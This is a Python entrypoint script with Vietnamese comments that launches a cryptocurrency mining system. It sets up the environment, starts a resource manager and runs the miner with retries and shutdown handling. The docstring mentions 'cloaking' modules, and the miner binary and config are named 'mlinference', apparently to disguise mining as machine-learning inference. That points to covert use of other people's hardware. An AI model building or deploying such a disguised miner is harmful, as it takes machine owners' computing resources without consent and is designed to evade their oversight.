"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
Thực hiện các bước thiết lập môi trường, khởi động các module quản lý tài nguyên và cloaking, và bắt đầu quá trình khai thác.
"""

import os
import sys
import subprocess
import threading
import signal
import time
from pathlib import Path

# Thêm đường dẫn tới các module trong mining_environment/scripts

SCRIPT_DIR = Path(__file__).resolve().parent / "mining_environment" / "scripts"
sys.path.append(str(SCRIPT_DIR))


from logging_config import setup_logging 

# Import các module Lớp 1: Môi Trường Khai Thác và tối ưu tài nguyên
import setup_env 
import system_manager  

# Import các module Lớp 2 đến lớp 9
# Giả sử bạn có các module như layer2, layer3, ..., layer9
# import layer2  # noqa: E402
# import layer3  # noqa: E402
# ...
# import layer9  # noqa: E402

# Import cấu hình logging từ logging_config.py
 

# Thiết lập đường dẫn tới thư mục logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# Thiết lập logging với logging_config.py
logger = setup_logging(
    'start_mining',
    Path(LOGS_DIR) / 'start_mining.log',
    'INFO'
)

# Sự kiện dừng để xử lý graceful shutdown
stop_event = threading.Event()

# Định nghĩa sự kiện để đồng bộ giữa các phần của script
mining_started_event = threading.Event()


def signal_handler(signum, frame):
    """
    Xử lý tín hiệu dừng (SIGINT, SIGTERM).
    Đánh dấu sự kiện dừng để các thread có thể dừng lại một cách nhẹ nhàng.
    """
    logger.info(
        f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác..."
    )
    stop_event.set()


# Đăng ký xử lý tín hiệu ngay sau khi định nghĩa hàm xử lý
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def initialize_environment():
    """
    Thiết lập môi trường khai thác bằng cách gọi setup_env.py.
    """
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)


def start_system_manager():
    """
    Khởi động quản lý tài nguyên bằng cách gọi system_manager.py.
    """
    logger.info("Khởi động Resource Manager.")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        try:
            system_manager.stop()
        except Exception as stop_error:
            logger.error(f"Lỗi khi dừng Resource Manager sau lỗi: {stop_error}")

def is_mining_process_running(mining_process):
    """
    Kiểm tra xem quá trình khai thác có đang chạy không.
    
    Args:
        mining_process (subprocess.Popen): Đối tượng quá trình khai thác.
    
    Returns:
        bool: True nếu đang chạy, False nếu không.
    """
    return mining_process and mining_process.poll() is None


def start_mining_process(retries=3, delay=5):
    """
    Khởi động quá trình khai thác bằng cách gọi mlinference với cơ chế thử lại.
    
    Args:
        retries (int): Số lần thử lại nếu khởi chạy quá trình thất bại.
        delay (int): Thời gian chờ giữa các lần thử (giây).
    
    Returns:
        subprocess.Popen or None: Đối tượng quá trình khai thác hoặc None nếu thất bại.
    """
    mining_command = os.getenv(
        'MINING_COMMAND',
        '/usr/local/bin/mlinference'
    )
    mining_config = os.path.join(
        os.getenv('CONFIG_DIR', '/app/mining_environment/config'),
        os.getenv('MINING_CONFIG', 'mlinference_config.json')
    )

    for attempt in range(1, retries + 1):
        logger.info(
            f"Thử khởi chạy quá trình khai thác (Cố gắng {attempt}/{retries})..."
        )
        try:
            mining_process = subprocess.Popen(
                [mining_command, '--config', mining_config]
            )
            logger.info(
                f"Quá trình khai thác đã được khởi động với PID: {mining_process.pid}"
            )

            # Kiểm tra xem quá trình có đang chạy không
            time.sleep(2)  # Chờ một thời gian ngắn để tiến trình khởi chạy
            if mining_process.poll() is not None:
                logger.error(
                    f"Quá trình khai thác đã kết thúc ngay sau khi khởi động với mã trả về: {mining_process.returncode}"
                )
                mining_process = None
            else:
                logger.info("Quá trình khai thác đang chạy.")
                mining_started_event.set()
                return mining_process
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác: {e}")
            mining_process = None

        if attempt < retries:
            logger.info(f"Đang đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)

    logger.error("Tất cả các cố gắng khởi chạy quá trình khai thác đã thất bại.")
    stop_event.set()
    return None

def main():
    """
    Hàm chính để khởi động toàn bộ hệ thống khai thác.
    """
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử =====")

    # Bước 1: Thiết lập môi trường
    initialize_environment()

    # Bước 2: Bắt đầu khai thác trong thread chính với cơ chế thử lại
    mining_process = start_mining_process(retries=3, delay=5)

    # Kiểm tra quá trình khai thác
    if not is_mining_process_running(mining_process):
        logger.error(
            "Quá trình khai thác không khởi động thành công sau nhiều cố gắng. "
            "Dừng hệ thống khai thác."
        )
        stop_event.set()  # Đảm bảo stop_event được kích hoạt
        system_manager.stop()  # Gọi stop để dừng quản lý tài nguyên
        sys.exit(1)

    # Bước 3: Khởi động Resource Manager trong thread riêng
    resource_thread = threading.Thread(target=start_system_manager, daemon=True)
    try:
        resource_thread.start()
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        system_manager.stop()
        sys.exit(1)

    # Chờ tín hiệu dừng
    try:
        while not stop_event.is_set():
            if mining_process:
                retcode = mining_process.poll()
                if retcode is not None:
                    logger.warning(
                        f"Quá trình khai thác đã kết thúc với mã trả về: {retcode}. "
                        "Dừng hệ thống khai thác."
                    )
                    stop_event.set()
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info(
            "Đã nhận tín hiệu KeyboardInterrupt. Đang dừng hệ thống khai thác..."
        )
        stop_event.set()
    finally:
        logger.info("Đang dừng các thành phần khai thác...")

        # Dừng quá trình khai thác nếu vẫn đang chạy
        try:
            if mining_process and mining_process.poll() is None:
                mining_process.terminate()
                mining_process.wait(timeout=10)
                logger.info("Quá trình khai thác đã được dừng.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng quá trình khai thác: {e}")

        # Dừng Resource Manager
        try:
            system_manager.stop()
            logger.info("Đã dừng tất cả các quản lý tài nguyên.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng các quản lý tài nguyên: {e}")

        # Chờ thread dừng nếu chưa hoàn tất
        if resource_thread.is_alive():
            resource_thread.join(timeout=5)
            if resource_thread.is_alive():
                logger.error("Thread Resource Manager không thể dừng hoàn toàn.")

        logger.info("===== Hoạt động khai thác tiền điện tử đã dừng thành công =====")

if __name__ == "__main__":
    main()
